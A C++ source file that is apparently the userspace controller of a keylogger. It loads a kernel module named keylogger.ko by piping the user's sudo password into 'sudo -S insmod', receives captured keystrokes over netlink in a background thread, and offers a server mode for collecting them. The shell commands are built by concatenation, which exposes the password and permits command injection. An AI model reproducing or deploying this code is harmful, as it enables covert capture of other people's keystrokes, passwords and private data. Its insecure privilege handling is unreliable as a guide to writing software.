#include <iostream>
#include <cstdlib> // For system()
#include <stdexcept>
#include <thread>
#include <memory>
#include <mutex>
#include <utility>

#include "usr_src/kmod_comms/NetlinkReceiver.hpp"
#define NETLINK_USER 31

using namespace std;

class KernelModuleManager {
public:
    KernelModuleManager(string  moduleName, string  password)
            : moduleName_(move(moduleName)), password(move(password)), isLoaded_(false) {
        loadModule();
    }

    ~KernelModuleManager() {
        try {
            unloadModule();
        } catch (const exception &e) {
            cerr << "Error in destructor: " << e.what() << endl;
        }
    }

    void loadModule() {
        if (isLoaded_) {
            cerr << "Module " << moduleName_ << " is already loaded." << endl;
            return;
        }

        stringstream command = {};
        command << "echo "
                << password
                << "| sudo -S insmod "
                << moduleName_;
        if (system(command.str().c_str()) != 0) {
            throw runtime_error("Failed to load kernel module " + moduleName_);
        }

        cout << "Kernel module " << moduleName_ << " loaded successfully." << endl;
        isLoaded_ = true;
    }

    void unloadModule() {
        if (!isLoaded_) {
            cerr << "Module " << moduleName_ << " is not loaded." << endl;
            return;
        }
        stringstream command = {};
        command << "echo "
                << password
                << "| sudo -S rmmod "
                << moduleName_;
        if (system(command.str().c_str()) != 0) {
            throw runtime_error("Failed to unload kernel module " + moduleName_);
        }

        cout << "Kernel module " << moduleName_ << " unloaded successfully." << endl;
        isLoaded_ = false;
    }

private:
    string moduleName_;
    string password;
    bool isLoaded_;
};

int main() {
    cout << "Print 'server' to start server. 'client' to start client:\n";
    try_again:
    string option;
    getline(cin,option);
    if(option == "server"){
        auto serv = ServerMain();
        serv.RunServer();
        while(true){
            getline(cin,option);
            if(option == "stop" || option == "quit" || option == "exit" || option == "q")
                break;
        }
    }
    else if(option == "client"){

        thread* t_receiver = nullptr;
        try {
            const char* password = getpass("Enter password: ");
            KernelModuleManager kmodManager("../../kernel_module/keylogger.ko", password);
            shared_ptr<NetlinkReceiver> receiver = make_shared<NetlinkReceiver>(NETLINK_USER);
            t_receiver = new thread([receiver]() {
                receiver->startReceiving();
            });

            cout << "Key logger running!" << endl;
            while (true) {
                string line;
                getline(cin, line);
                if(line == "exit" || line == "q")
                    break;
            }

            cout << "Closing keylogger" << endl;

            // Stop the receiver and join the thread
            receiver->stopReceiving();
            if (t_receiver->joinable()) {
                t_receiver->join();
            }

            delete t_receiver;

        } catch (const exception& e) {
            cerr << "Error: " << e.what() << endl;
            return EXIT_FAILURE;
        }
    }
    else
        goto try_again;



    return EXIT_SUCCESS;
}

